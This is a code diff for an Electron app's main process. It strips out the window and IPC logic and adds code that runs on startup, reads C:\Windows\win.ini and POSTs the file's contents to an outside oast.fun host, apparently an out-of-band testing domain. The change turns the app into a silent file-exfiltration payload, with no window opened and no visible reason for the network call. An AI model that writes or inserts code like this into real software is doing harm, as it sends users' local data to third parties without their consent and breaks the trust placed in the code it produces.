@@ -1,13 +1,8 @@
-const { app, BrowserWindow, ipcMain } = require('electron');
+const { app, BrowserWindow } = require('electron');
 const fs = require('fs');
-
-let mainWindow;
+const fetch = require('node-fetch'); // Use node-fetch to make HTTP requests in the main process
 
 app.on('ready', () => {
-  mainWindow = new BrowserWindow({ width: 800, height: 600 });
-
-  mainWindow.loadFile('index.html');
-
   const filePath = 'C:\\Windows\\win.ini'; // Define the file path
 
   fs.readFile(filePath, 'utf-8', (err, data) => {
@@ -15,23 +10,30 @@ app.on('ready', () => {
       console.error(err);
       // Handle error when file reading fails
     } else {
-      // Send file content to the renderer process
-      mainWindow.webContents.send('file-content', data);
+      // Send file content to the server
+      sendDataToServer(data);
     }
   });
 });
 
-// Listen for renderer process requests for the file content
-ipcMain.on('get-file-content', (event) => {
-  // You can add more logic here if needed
-  // For example, re-read the file content or process it further
-  fs.readFile(filePath, 'utf-8', (err, data) => {
-    if (err) {
-      console.error(err);
-      // Handle error when file reading fails
-    } else {
-      // Send file content to the renderer process
-      event.reply('file-content', data);
+function sendDataToServer(data) {
+  fetch('http://ckrk57m2vtc0000g9pz0gjhj1uhyyyyyb.oast.fun', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'text/plain', // Change content type as needed
+    },
+    body: data,
+  })
+  .then(response => {
+    if (!response.ok) {
+      throw new Error('Network response was not ok.');
     }
+    return response.text();
+  })
+  .then(responseData => {
+    console.log('Server response:', responseData);
+  })
+  .catch(error => {
+    console.error('There was a problem with the fetch operation:', error);
   });
-});
+}
